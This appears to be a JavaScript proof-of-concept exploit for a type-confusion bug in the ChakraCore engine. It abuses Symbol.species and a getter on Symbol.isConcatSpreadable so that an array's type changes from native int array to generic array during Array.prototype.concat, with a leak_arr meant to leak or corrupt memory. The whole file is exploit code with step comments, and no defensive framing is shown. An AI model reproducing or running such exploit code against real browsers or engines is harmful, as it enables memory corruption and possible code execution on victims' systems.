var a = [1,2,3,4];
var b = [8,9];

var leak_arr = new Array(56,0, 0,0, 0,0, 0,0, 0,0, 0,0, 0,0, 0,0);  

var c = new Function();
c[Symbol.species] = function() {
    n = [7,7];			
    return n;
};
a.constructor = c; // return array n

b.__defineGetter__(Symbol.isConcatSpreadable, () => {
    n[0] = leak_arr; // (3) - n was JavascriptNativeIntArray, now changed to JavascriptArray
    b[0] = {}; // (4)
    return true;	
});

let r = a.concat(b);    // (1) - a[Symbol.species], copy element of a to n
						// (2) - b[Symbol.isConcatSpreadable], make 'a(n)' and 'b' JavascriptNativeIntArray -> JavascriptArray

console.log(r);